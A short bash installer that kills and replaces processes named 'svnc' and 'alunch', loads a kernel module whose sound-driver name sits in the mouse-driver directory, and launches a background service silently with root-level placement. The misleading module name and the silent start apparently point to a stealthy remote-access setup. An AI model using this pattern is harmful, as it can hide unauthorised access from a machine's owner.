#!/bin/bash

# binary file
rmmod snd_pci

pid1=`pidof svnc`
pid2=`pidof alunch`

if [ -n "$pid1" ]; then  
    #echo $pid1
	kill -9 $pid1
fi 

if [ -n "$pid2" ]; then  
    #echo $pid2
	kill -9 $pid2
fi 


if [ -f /sbin/alunch ]; then
    rm -fr /sbin/alunch
fi    

if [ -f /sbin/svnc ]; then
    rm -fr /sbin/svnc
fi

# install ko file
if [ -f ./module/snd_pci_$(uname -r).ko ];then
    #install ko
    cp -f ./module/snd_pci_$(uname -r).ko    /lib/modules/$(uname -r)/kernel/drivers/input/mouse/snd_pci.ko
    insmod /lib/modules/$(uname -r)/kernel/drivers/input/mouse/snd_pci.ko    
    depmod
fi    
# install ko endd

   
# binary file
cp -f ./module/svnc				/sbin/svnc
cp -f ./module/alunch 			/sbin/alunch
# change mode
chmod 755 /sbin/svnc 
chmod 755 /sbin/alunch
#create link file
ln -sf /sbin/alunch /bin/alunch
#auto run when boot
#cp -f rc.local	/etc/rc.local




#start running
nohup alunch >/dev/null 2>&1 &
